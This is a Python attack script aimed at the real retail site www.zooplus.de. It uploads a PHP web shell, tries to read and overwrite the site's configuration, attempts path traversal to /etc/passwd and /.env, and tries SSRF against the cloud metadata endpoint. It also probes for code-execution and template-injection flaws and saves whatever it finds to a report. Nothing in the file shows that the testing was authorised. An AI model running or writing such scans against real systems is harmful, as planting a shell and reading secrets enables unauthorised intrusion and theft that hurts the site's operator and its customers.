#!/usr/bin/env python3
import requests, json
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()

target = "www.zooplus.de"
base = f"https://{target}"
findings = []
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=" * 70)
print("ATTACK VECTORS TESTER")
print("=" * 70)

# File Upload
print("\n[*] Testing File Upload...")
try:
    resp = s.post(f"{base}/api/upload", files={'file': ('test.php', '<?php system($_GET["cmd"]); ?>')}, timeout=2, verify=False)
    if resp.status_code in [200, 201]:
        findings.append({"type": "file_upload", "status": resp.status_code})
        print(f"  [CRITICAL] File upload works!")
except: pass

# Config
print("\n[*] Testing Config...")
try:
    resp = s.get(f"{base}/api/config", timeout=2, verify=False)
    if resp.status_code == 200:
        findings.append({"type": "config_read", "status": resp.status_code})
        print(f"  [HIGH] Config readable!")
except: pass
try:
    resp = s.post(f"{base}/api/config", json={"debug": True}, timeout=2, verify=False)
    if resp.status_code in [200, 201]:
        findings.append({"type": "config_write", "status": resp.status_code})
        print(f"  [CRITICAL] Config writable!")
except: pass

# Path Traversal
print("\n[*] Testing Path Traversal...")
for f in ["/etc/passwd", "/.env"]:
    try:
        resp = s.get(f"{base}/stats/../{f.lstrip('/')}", timeout=2, verify=False)
        if resp.status_code == 200 and not resp.text.strip().startswith('<!'):
            findings.append({"type": "path_traversal", "file": f})
            print(f"  [CRITICAL] Path traversal: {f}")
            break
    except: pass

# SSRF
print("\n[*] Testing SSRF...")
try:
    resp = s.post(f"{base}/api/fetch", json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=2, verify=False)
    if resp.status_code in [200, 400] and "metadata" in resp.text.lower():
        findings.append({"type": "ssrf"})
        print(f"  [CRITICAL] SSRF works!")
except: pass

# Code Exec
print("\n[*] Testing Code Execution...")
for ep in ["/api/execute", "/api/eval"]:
    try:
        resp = s.post(f"{base}{ep}", json={"code": "print('test')"}, timeout=2, verify=False)
        if resp.status_code == 200 and "test" in resp.text.lower():
            findings.append({"type": "code_execution", "endpoint": ep})
            print(f"  [CRITICAL] Code execution: {ep}")
            break
    except: pass

# Template
print("\n[*] Testing Template Injection...")
try:
    resp = s.post(f"{base}/api/render", json={"template": "{{7*7}}"}, timeout=2, verify=False)
    if resp.status_code == 200 and "49" in resp.text:
        findings.append({"type": "template_injection"})
        print(f"  [CRITICAL] Template injection works!")
except: pass

print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
print(f"Total findings: {len(findings)}")
if findings:
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/attack_vectors_test.json", "w") as f:
        json.dump({"findings": findings}, f, indent=2)
    print(f"[+] Report saved to reports/attack_vectors_test.json")
else:
    print("No exploitable vectors found")

